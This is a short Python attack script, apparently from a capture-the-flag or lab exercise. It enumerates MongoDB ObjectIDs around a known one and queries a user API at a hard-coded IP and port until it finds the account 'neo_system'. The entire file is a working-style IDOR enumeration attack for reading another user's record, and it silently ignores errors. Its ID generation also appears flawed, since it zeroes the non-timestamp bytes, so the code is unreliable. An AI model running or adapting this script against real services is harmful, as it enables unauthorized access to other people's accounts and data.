import requests
from bson.objectid import ObjectId
from datetime import timedelta

base_url = "http://94.237.62.135:55712/api/user?id="
known_oid = ObjectId("6860049acf57416e56e0bb31")  # your ID

for i in range(-1000, 1000):
    try:
        # Generate nearby ObjectID
        test_oid = ObjectId.from_datetime(known_oid.generation_time + timedelta(seconds=i))
        oid_str = str(test_oid)

        # Send GET request
        r = requests.get(base_url + oid_str)

        # Look for target username
        if "neo_system" in r.text:
            print(f"[+] FOUND neo_system at {oid_str}")
            print(r.text)
            break

    except Exception as e:
        continue  # silently ignore errors and continue loop